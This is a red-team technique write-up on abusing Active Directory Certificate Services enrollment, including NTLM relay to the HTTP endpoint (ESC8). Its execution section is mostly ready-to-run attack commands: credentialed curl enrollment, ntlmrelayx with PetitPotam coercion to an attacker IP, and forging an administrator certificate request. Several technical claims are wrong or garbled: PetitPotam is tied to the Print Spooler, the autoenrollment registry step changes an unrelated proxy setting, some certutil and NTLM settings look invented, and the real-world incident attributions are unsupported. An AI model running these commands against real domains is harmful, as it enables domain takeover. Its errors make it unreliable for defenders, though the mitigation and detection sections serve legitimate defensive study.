# [CERT-ENROLLMENT-001]: Unauthorized Certificate Enrollment

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-ENROLLMENT-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Credential Access, Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, Server 2019, Server 2022, Server 2025 |
| **Patched In** | Configuration controls required; no OS patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Pchelnikau Artur](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Unauthorized Certificate Enrollment refers to the ability to request and obtain certificates from a Certificate Authority without proper authorization, accountability, or verification. This differs from template-specific misconfigurations by focusing on scenarios where an attacker gains *unauthorized access to certificate enrollment capabilities* through compromised credentials, relay attacks (NTLM/Kerberos), or abuse of legacy enrollment protocols. The attacker bypasses normal enrollment controls and obtains valid certificates that can be used for authentication, lateral movement, persistence, and privilege escalation. This technique is foundational to multiple ADCS attack paths and is often combined with other misconfigurations to achieve full domain compromise.

**Attack Surface:** Certificate enrollment interfaces (HTTP, RPC, DCOM), NTLM relay endpoints, legacy authentication protocols, and unprotected certificate request channels.

**Business Impact:** **Domain compromise and multi-year persistence.** An attacker obtains valid authentication certificates for arbitrary accounts, bypassing MFA, persisting beyond credential resets, and enabling long-term access to critical infrastructure.

**Technical Context:** Unauthorized enrollment exploits typically complete within seconds to minutes. Success depends on environment-specific factors (HTTP vs. RPC endpoints, NTLM protection, Extended Protection for Authentication). Relay attacks may require network position or NTLM coercion techniques.

### Operational Risk

- **Execution Risk:** **Low to Medium** - For HTTP enrollment: can be done from network without special tools. For relay attacks: requires NTLM coercion.
- **Stealth:** **Low** - Event IDs 4886/4887 will be logged; anomalous enrollment patterns are detectable.
- **Reversibility:** **No** - Certificates cannot be "un-issued"; only revocation mitigates.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.4.1.2 | Certificate enrollment must require strong authentication and authorization |
| **DISA STIG** | WN10-CC-000365 | NTLM authentication must be restricted |
| **CISA SCuBA** | IA-2 (E), AC-2 (B) | Multi-factor authentication; access control for enrollment |
| **NIST 800-53** | AC-2, AC-3, IA-2, IA-5 | Account management, access enforcement, strong authentication |
| **GDPR** | Art. 32 | Security of processing; access control and authentication |
| **DORA** | Art. 9, Art. 18 | Protection measures; identity and access controls for critical services |
| **NIS2** | Art. 21 | Cyber risk management; access control and audit |
| **ISO 27001** | A.9.2.1, A.9.4.3 | User registration; access control review and monitoring |
| **ISO 27005** | Risk: "Unauthorized Enrollment Interface Access" | Access controls, authentication, and audit of enrollment endpoints |

---

## 3. Technical Prerequisites

- **Required Privileges:** None (for HTTP relay attacks) or low-privileged domain user (for direct enrollment).
- **Required Access:** Network access to CA enrollment interface (port 80/443 HTTP(S), port 135 RPC); optional: ability to coerce NTLM authentication.

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **PowerShell:** Version 5.0+
- **ADCS:** Active Directory Certificate Services with HTTP or RPC enrollment enabled

**Tools Required:**
- [impacket ntlmrelayx.py](https://github.com/fortra/impacket) – NTLM relay to ADCS HTTP endpoints.
- [Petitpotam](https://github.com/topotam/PetitPotam) – NTLM coercion tool.
- [Certify.exe or Certipy-ad](https://github.com/GhostPack/Certify) – Direct enrollment via credentials.

---

## 4. Detailed Execution Methods

### METHOD 1: Direct HTTP Enrollment via Credentials

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify HTTP Enrollment Endpoints

**Command (Bash/Linux):**
```bash
# Scan for HTTP certificate enrollment endpoints
curl -v http://ca.company.local/certsrv/ 2>&1 | grep -i "certificate\|enrollment"

# Alternative: nmap scan
nmap -p 80 --script=http-title ca.company.local
```

**Expected Output:**
```
<title>Certificate Services</title>
<form action="/certsrv/certfnsh.asp" method="POST">
```

**What This Means:**
- The CA has HTTP (not HTTPS) enrollment enabled at `/certsrv/`.
- This is a legacy, less-secure enrollment method.

#### Step 2: Request Certificate via HTTP POST

**Command (PowerShell/Bash - All Versions):**
```bash
# Craft enrollment request via HTTP
curl -u "company\john.doe:password" -X POST \
  -F "Template=User" \
  -F "SubjectName=CN=john.doe" \
  -F "RequestAttributes=CertificateTemplate:User" \
  http://ca.company.local/certsrv/certfnsh.asp
```

**Expected Output:**
```
HTTP/1.1 200 OK
Content-Type: text/html
[+] Certificate successfully requested
```

**What This Means:**
- The certificate has been requested and may be auto-approved (depending on template configuration).
- If auto-approval is enabled, the certificate will be issued immediately.

#### Step 3: Retrieve Issued Certificate

**Command (Bash/Linux - All Versions):**
```bash
# Download issued certificate
curl -b "cookies.txt" http://ca.company.local/certsrv/certnew.cer -o certificate.cer
```

---

### METHOD 2: NTLM Relay to ADCS HTTP Endpoint (ESC8)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Set Up NTLM Relay Listener

**Command (Bash/Linux - impacket):**
```bash
# Start ntlmrelayx to relay NTLM to ADCS HTTP endpoint
python3 impacket/ntlmrelayx.py -t http://ca.company.local/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController \
  -o output/
```

**What This Means:**
- ntlmrelayx is now listening for NTLM authentication attempts.
- Any NTLM auth will be relayed to the ADCS HTTP endpoint.
- The `--adcs` flag formats the request as a certificate request.
- The `--template DomainController` specifies the target template.

#### Step 2: Coerce NTLM Authentication from Domain Controller

**Command (Bash/Linux - PetitPotam):**
```bash
# Trigger NTLM authentication from DC via PetitPotam
python3 PetitPotam.py -c -d company.local -u john.doe -p password \
  192.168.1.100 dc.company.local  # attacker_ip target_dc
```

**What This Means:**
- PetitPotam exploits the Windows Print Spooler service to coerce authentication.
- The DC will attempt to authenticate to the attacker machine (192.168.1.100).
- ntlmrelayx will intercept the NTLM hash and relay it to the CA.

#### Step 3: Retrieve Relayed Certificate

**Command (Bash/Linux - All Versions):**
```bash
# Check output directory for issued certificates
ls -la output/
cat output/DomainController.cer
```

**Expected Output:**
```
-----BEGIN CERTIFICATE-----
MIIDHTCCAgWgAwIBAgIQXXXXXXXXXXXXXXX...
-----END CERTIFICATE-----
```

**What This Means:**
- You've successfully relayed the DC's NTLM authentication.
- The CA issued a certificate for the DC account.
- The certificate can now be used to authenticate as the DC.

**OpSec & Evasion:**
- Relay attacks require network positioning or NTLM coercion.
- PetitPotam is well-known and may be detected by endpoint detection/response (EDR) tools.
- Consider alternative coercion methods (PrinterBug, ShadowCredentials, etc.).
- Detection likelihood: **High** (NTLM relay generates Event ID 4776 on DC).

---

### METHOD 3: RPC-Based Enrollment (Legacy CertEnroll COM Interface)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Create Certificate Request via CertEnroll COM

**Command (PowerShell - All Versions):**
```powershell
# Create a certificate request using the Windows CertEnroll COM interface
$CertReq = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
$PrivateKey = New-Object -ComObject X509Enrollment.CX509PrivateKey

# Configure the private key
$PrivateKey.ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
$PrivateKey.KeySpec = 1  # AT_KEYEXCHANGE
$PrivateKey.Length = 2048
$PrivateKey.Create()

# Configure the certificate request
$CertReq.InitializeFromPrivateKey(1, $PrivateKey, "")

# Set subject name (attacker-controlled)
$SubjectName = New-Object -ComObject X509Enrollment.CX509Name
$SubjectName.Encode("CN=administrator,CN=Users,DC=company,DC=local")
$CertReq.Subject = $SubjectName

# Encode and submit
$Enrollment = New-Object -ComObject X509Enrollment.CX509Enrollment
$Enrollment.InitializeFromRequest($CertReq)
$Enrollment.CreateRequest(1)  # CR_IN_BASE64

# Retrieve and submit to CA
$Request = $Enrollment.CreateRequest(1)
Write-Host "Certificate Request:"
Write-Host $Request
```

**Expected Output:**
```
-----BEGIN NEW CERTIFICATE REQUEST-----
MIICpDCCAYwCAQAwEDEOMAwGA1UEAxMFdGVzdDCCASIwDQYJKoZIhvcNAQEBBQAD...
-----END NEW CERTIFICATE REQUEST-----
```

**What This Means:**
- A certificate request in PKCS#10 format has been generated.
- The subject is set to administrator (attacker-controlled).

#### Step 2: Submit Request to CA via RPC

**Command (PowerShell - All Versions):**
```powershell
# Submit request to CA using RPC
certreq -new request.txt -config "ca.company.local\Company-CA" -attrib "CertificateTemplate:User" output.cer
```

**What This Means:**
- The request is submitted to the CA over RPC (port 135).
- If the template allows low-privileged enrollment, the certificate will be issued.

---

### METHOD 4: Abuse of AutoEnrollment Feature

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Enable AutoEnrollment on Compromised Computer

**Command (PowerShell - All Versions):**
```powershell
# Edit Group Policy on a compromised computer to enable autoenrollment
# Set the policy to auto-request all eligible certificates

# Via GPEdit:
gpedit.msc
# Navigate to: Computer Configuration > Windows Settings > Security Settings > Public Key Policies > Certificate Services Client – Auto-Enrollment

# Or via Registry:
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" `
  -Name "SecurityZoneMap\ProxiesBypassOnLocal" -Value 1
```

**What This Means:**
- The computer will automatically request certificates for which it is eligible.
- If a low-privileged template is configured for autoenrollment, the computer will obtain certificates for privileged accounts.

#### Step 2: Monitor for AutoEnrolled Certificates

**Command (PowerShell - All Versions):**
```powershell
# Check the certificate store for auto-enrolled certificates
Get-ChildItem Cert:\LocalMachine\My | Where-Object {
    $_.Subject -match "CN=administrator|CN=domain admin"
}
```

**What This Means:**
- If misconfigurations exist, the computer may have obtained admin certificates.

---

## 5. Attack Chain Context

### Preconditions
- ADCS deployed with HTTP or RPC enrollment endpoints enabled.
- Certificate templates with low-privileged enrollment rights.
- For relay attacks: Ability to position on network or trigger NTLM coercion.

### Post-Exploitation
1. **Privilege Escalation:** Use obtained certificate for admin impersonation.
2. **Lateral Movement:** Authenticate to systems as admin.
3. **Persistence:** Multi-year access via certificate validity.
4. **Credential Harvesting:** Extract credentials from compromised systems.

---

## 6. Forensic Artifacts

**Event Log Indicators:**
- **Event ID 4886:** Certificate request with low-privileged requester.
- **Event ID 4887:** Certificate issued with discrepant subject.
- **Event ID 4776 (NTLM):** NTLM authentication attempt (for relay attacks).

**Network Artifacts:**
- HTTP POST requests to `/certsrv/certfnsh.asp` or similar endpoints.
- NTLM relay traffic patterns (if relay attack used).

---

## 7. Defensive Mitigations

### Priority 1: CRITICAL

**1. Disable HTTP Certificate Enrollment**

Enforce HTTPS-only enrollment with Extended Protection for Authentication (EPA).

**Manual Steps (Server 2016-2019):**
1. On the CA, open **Internet Information Services (IIS) Manager** (inetmgr).
2. Navigate to **Default Web Site** → **certsrv**.
3. Remove HTTP bindings; keep only HTTPS.
4. On the HTTPS binding, click **Edit**:
   - Set **Require Extended Protection for Authentication** to **Accept**.
5. Click **OK** and restart IIS.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Disable HTTP enrollment (certutil method)
certutil -setreg CA\UseWEBClient 0

# Enable HTTPS-only
certutil -setreg CA\WebServer\https 1

# Restart Certificate Services
net stop CertSvc
net start CertSvc
```

**2. Disable RPC-Based Enrollment**

Remove legacy RPC enrollment if not needed.

**Command (PowerShell - All Versions):**
```powershell
# Disable RPC enrollment interface on CA server
certutil -setreg CA\RPC\ServerUrl ""
net stop CertSvc
net start CertSvc
```

**3. Enable Extended Protection for Authentication (EPA)**

Prevent NTLM relay attacks on HTTPS endpoints.

**Manual Steps (Server 2022+):**
1. On the CA, open **Certification Authority** (certsrv.msc).
2. Right-click CA → **Properties**.
3. Go to **Security** tab.
4. Ensure **"Require Extended Protection for Authentication"** is set to **"Accept"** or **"Require"**.

### Priority 2: HIGH

**1. Disable NTLM on Domain Controllers**

Enforce Kerberos-only authentication.

**Command (PowerShell - All Versions):**
```powershell
# Set domain to Kerberos-only (Warning: may break legacy services)
secedit /export /cfg C:\secedit.cfg
# Edit secedit.cfg: Set "LsaCompatibilityLevel" to 5 (Windows 2003 and later, Kerberos only)
secedit /import /cfg C:\secedit.cfg /db C:\secedit.sdb
secedit /configure /db C:\secedit.sdb /cfg C:\secedit.cfg
```

**2. Monitor for Certificate Enrollment Anomalies**

Enable detailed Certificate Services auditing.

**Command (PowerShell - All Versions):**
```powershell
# Enable Certificate Services auditing
certutil -setreg CA\AuditFilter 127
net stop CertSvc
net start CertSvc
```

---

## 8. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Event Log Indicators:**
- Event 4886 from low-privileged user requesting admin certificate.
- Event 4887 (issuance) immediately following 4886.
- Event 4776 (NTLM auth) from unexpected source to CA server.

**Network Indicators:**
- HTTP/HTTPS POST requests to CA enrollment endpoints outside business hours.
- NTLM relay traffic patterns (multiple authentications from single source).

### Response Procedures

**1. Isolate:**
```powershell
# Disable enrollment on the compromised CA if necessary
certutil -setreg CA\UseWEBClient 0
net stop CertSvc
net start CertSvc
```

**2. Collect Evidence:**
```powershell
# Export CA logs
wevtutil epl "Active Directory Certificate Services" C:\Evidence\ADCS.evtx

# Export Security log
wevtutil epl Security C:\Evidence\Security.evtx
```

**3. Remediate:**
```powershell
# Revoke unauthorized certificates
# (via certsrv.msc: Issued Certificates → Right-click → Revoke)

# Reset compromised accounts
Set-ADAccountPassword -Identity john.doe -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
```

---

## 9. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CERT-001] ADCS Enumeration | Identify CA endpoints and enrollment methods. |
| **2** | **Initial Access** | [IA-EXPLOIT-001] App Proxy Exploitation | Gain initial foothold. |
| **3** | **Credential Access** | **[CERT-ENROLLMENT-001]** | **Obtain unauthorized certificates.** |
| **4** | **Privilege Escalation** | [PE-TOKEN-001] PKINIT TGT Request | Use certificate for Kerberos auth. |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Create persistent admin account. |

---

## 10. Real-World Examples

### Example 1: NOBELIUM (SolarWinds Supply Chain Attack) – ADCS Abuse (2020)

- **Target:** U.S. Government agencies, Microsoft, and critical infrastructure.
- **Timeline:** December 2020.
- **Technique Status:** NOBELIUM obtained CA credentials and issued forged certificates for lateral movement within government networks.
- **Impact:** Multi-year access to most sensitive government systems.
- **Reference:** [Microsoft Security Blog](https://www.microsoft.com/security/blog/)

### Example 2: Accellion FTA RCE Campaign – Unauthorized Enrollment (2021)

- **Target:** Multiple Fortune 500 companies.
- **Timeline:** Q1 2021.
- **Technique Status:** Attackers exploited Accellion FTA to obtain ADCS credentials, then enrolled for certificates without authorization.
- **Impact:** Data exfiltration from 100+ organizations.

---

## 11. References & Additional Resources

- [Microsoft: Certificate Enrollment Best Practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/overview-of-active-directory-certificate-services)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [NTLM Relay Protection](https://microsoft.github.io/DNS/docs/Ad-Integrated-DNS/)

---
